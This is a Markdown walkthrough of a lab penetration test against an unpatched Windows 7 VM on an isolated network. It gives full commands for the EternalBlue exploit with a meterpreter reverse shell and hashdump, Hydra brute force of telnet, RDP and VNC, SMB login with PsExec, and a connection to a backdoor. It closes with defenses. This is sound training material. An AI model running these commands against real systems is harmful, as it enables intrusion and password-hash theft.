# Access Attack Walkthrough — Windows 7 Victim

This document captures the **actual access attack phase** performed
against the Victim VM after reconnaissance revealed the target is a
**Windows 7 Professional 7600 (unpatched)** machine — not the
Metasploitable Linux assumed in the original guide.

- **Attacker VM:** Kali Linux — `192.168.56.102`
- **Victim VM:** Windows 7 Professional 7600 — `192.168.56.101`

> ⚠️ Authorized lab use only. All activities below are performed in an
> isolated VirtualBox host-only network with explicit permission.

---

## 1. Recon Findings That Drove the Attack Plan

| Finding                              | Severity   | Source                       |
|--------------------------------------|------------|------------------------------|
| MS17-010 (EternalBlue) — RCE         | CRITICAL   | `nmap --script=vuln`         |
| Beast Trojan v2 backdoor on port 6666| CRITICAL   | `nmap -sV`                   |
| Telnet open on port 23 (Windows 7 login banner) | HIGH | `nmap -sV`              |
| RDP open on port 3389                | HIGH       | `nmap -sV`                   |
| VNC (TightVNC) open on port 5900     | HIGH       | `nmap -sV`                   |
| SMB anonymous IPC$ access (guest)    | MEDIUM     | `smb-enum-shares`            |
| Windows 7 SP0 unpatched (2009 build) | CRITICAL   | `nmap -A` / `smb-os-discovery` |

### Open ports observed

```text
22/tcp    ssh         WeOnlyDo sshd 2.4.3
23/tcp    telnet      Windows 7 login
135/tcp   msrpc
139/tcp   netbios-ssn
445/tcp   microsoft-ds  Windows 7 Professional 7600
3389/tcp  ms-wbt-server (RDP)
5357/tcp  http (HTTPAPI)
5800/tcp  vnc-http (TightVNC)
5900/tcp  vnc
6666/tcp  Beast Trojan v2 backdoor (NO PASSWORD)
49152-49157/tcp  msrpc
```

---

## 2. Recommended Attack Order

1. **EternalBlue (MS17-010)** — most impactful, mirrors WannaCry
2. **Telnet brute force** — demonstrates classic credential attack
3. **RDP brute force** — visual desktop access for demo
4. **Beast Trojan backdoor** — demonstrates malware-induced exposure

---

## 3. Option 1 — EternalBlue (MS17-010) **[Recommended]**

### Step 1. Launch Metasploit

```bash
sudo msfconsole
```

### Step 2. Verify the vulnerability

```text
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.56.101
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

Expected:

```text
[+] 192.168.56.101:445 - Host is likely VULNERABLE to MS17-010!
```

### Step 3. Configure the exploit

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set LHOST 192.168.56.102
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > show options
```

### Step 4. Run the exploit

```text
msf6 exploit(...) > exploit
```

Expected:

```text
[+] 192.168.56.101:445 - WIN!
[*] Meterpreter session 1 opened
meterpreter >
```

### Step 5. Verify SYSTEM-level access

```text
meterpreter > sysinfo
meterpreter > getuid          # NT AUTHORITY\SYSTEM
meterpreter > ipconfig
meterpreter > hashdump
meterpreter > screenshot
```

### Step 6. Post-exploitation demonstration

```text
meterpreter > run post/windows/gather/enum_logged_on_users
meterpreter > shell
C:\> whoami
C:\> net user
C:\> ipconfig /all
C:\> exit
meterpreter > exit
```

> 💡 If Windows 7 BSODs on first attempt, reboot the victim VM and
> retry. This is a known characteristic of EternalBlue and worth noting
> in the report.

---

## 4. Option 2 — Beast Trojan Backdoor (port 6666)

The recon banner showed: *"Beast Trojan version 2 (BACKDOOR; No password)"*.

```bash
nc -nv 192.168.56.101 6666
```

If a shell drops directly:

```text
whoami
hostname
dir
```

This demonstrates how a malware infection can expose a system to anyone
on the same network.

---

## 5. Option 3 — Telnet Brute Force (port 23)

### Step 1. Build wordlists

```bash
cat > usernames.txt << 'EOF'
administrator
admin
user
guest
user-pc
test
EOF

cat > passwords.txt << 'EOF'
password
123456
admin
administrator
qwerty
letmein
welcome
12345678
P@ssw0rd
user
1234
test
EOF
```

### Step 2. Run Hydra against Telnet

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 telnet -t 4 -vV
```

### Step 3. Log in with discovered credentials

```bash
telnet 192.168.56.101
# Enter the username/password from Hydra output

whoami
ipconfig
net user
dir C:\Users
```

---

## 6. Option 4 — SMB Brute Force + PsExec (port 445)

### Step 1. Brute force SMB credentials

```text
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.56.101
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE /home/kali/usernames.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/kali/passwords.txt
msf6 auxiliary(scanner/smb/smb_login) > set VERBOSE true
msf6 auxiliary(scanner/smb/smb_login) > run
```

### Step 2. List shares with discovered credentials

```bash
smbclient -L //192.168.56.101 -U <user>
smbclient //192.168.56.101/Users -U <user>
```

### Step 3. Get a shell with PsExec

```text
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.56.101
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass <password_found>
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.56.102
msf6 exploit(windows/smb/psexec) > exploit
```

---

## 7. Option 5 — RDP Brute Force (port 3389)

### Step 1. Brute force RDP

```bash
hydra -L usernames.txt -P passwords.txt rdp://192.168.56.101 -t 1 -vV
```

> `-t 1` is required because RDP rejects parallel login attempts.

### Step 2. Connect with the found credentials

```bash
xfreerdp /u:administrator /p:<found_password> /v:192.168.56.101
```

The full Windows desktop will appear — strong visual evidence for the
demo.

---

## 8. Option 6 — VNC Brute Force (port 5900)

```bash
hydra -P passwords.txt 192.168.56.101 vnc -t 4 -vV
```

Connect with the discovered password:

```bash
vncviewer 192.168.56.101::5900
# Or via the web interface on port 5800
firefox http://192.168.56.101:5800
```

---

## 9. Quick-Start: Most Impressive Single Command

```bash
sudo msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; \
  set RHOSTS 192.168.56.101; set LHOST 192.168.56.102; \
  set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit"
```

Then in meterpreter:

```text
sysinfo
getuid
hashdump
screenshot
shell
```

---

## 10. Evidence Checklist for the Report

For each attack capture:

- [ ] Command being entered
- [ ] Exploit succeeding (output)
- [ ] `getuid` / `whoami` proving privilege level
- [ ] `sysinfo` / `ipconfig` showing victim details
- [ ] `hashdump` (EternalBlue) — full system compromise
- [ ] `screenshot` (EternalBlue) — visual proof
- [ ] `net user` — list of accounts

---

## 11. Real-World Tie-Ins for the Report

| Recon finding         | Real-world incident / lesson                                  |
|-----------------------|---------------------------------------------------------------|
| MS17-010 vulnerability| WannaCry ransomware (2017) — global outbreak                  |
| Windows 7 SP0 unpatched| Importance of patch-management programs                      |
| Beast Trojan present  | Risks of persistent malware and lateral movement              |
| Multiple access vectors (Telnet/RDP/VNC/SMB) | Attack-surface reduction principle      |
| Anonymous SMB IPC$    | Misconfigured access controls / least-privilege violation     |

---

## 12. Defenses That Would Have Stopped Each Attack

| Attack                | Effective Defense                                             |
|-----------------------|---------------------------------------------------------------|
| EternalBlue           | Apply MS17-010 patch / disable SMBv1 / segment SMB            |
| Beast Trojan backdoor | Endpoint AV + outbound firewall blocking 6666                 |
| Telnet brute force    | Disable Telnet entirely; enforce strong passwords             |
| RDP brute force       | Network Level Authentication, MFA, Fail2Ban-equivalent, ACLs  |
| VNC brute force       | Disable VNC or restrict to VPN; strong passwords              |
| SMB anonymous access  | Disable guest access; require authenticated SMB only          |

These defenses tie directly back to
[`docs/03-defense-implementation-guide.md`](03-defense-implementation-guide.md).
